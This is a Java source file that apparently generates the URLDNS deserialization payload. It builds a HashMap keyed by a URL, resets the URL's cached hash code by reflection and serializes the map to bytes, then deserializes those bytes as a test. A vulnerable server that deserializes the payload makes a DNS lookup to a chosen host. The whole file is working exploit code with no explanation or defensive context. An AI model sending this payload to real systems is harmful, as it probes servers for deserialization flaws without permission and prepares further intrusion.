package org.payload.yuansheng.urldns;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.Arrays;
import java.util.HashMap;

public class URLDNS {
    public static byte[] urldns(String testurl) throws Exception {
        URLStreamHandler handler = new URLStreamHandler1();
        HashMap hashmap = new HashMap();
        URL url = new URL(null, testurl, handler);
        hashmap.put(url,"xx");

        Class clazz = Class.forName("java.net.URL");
        Field f = clazz.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url,-1);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashmap);
        oos.close();
        byte[] arr = barr.toByteArray();
        return arr;
    }
    static class URLStreamHandler1 extends URLStreamHandler{
        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }
 /*
        protected synchronized InetAddress getHostAddress(URL u){
            return null;
        }
 */
    }
    public static void main(String[] args) throws Exception {
        byte[] barr= urldns("xxx");
        System.out.println(Arrays.toString(barr));
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr));
        Object o = (Object)ois.readObject();
    }
}

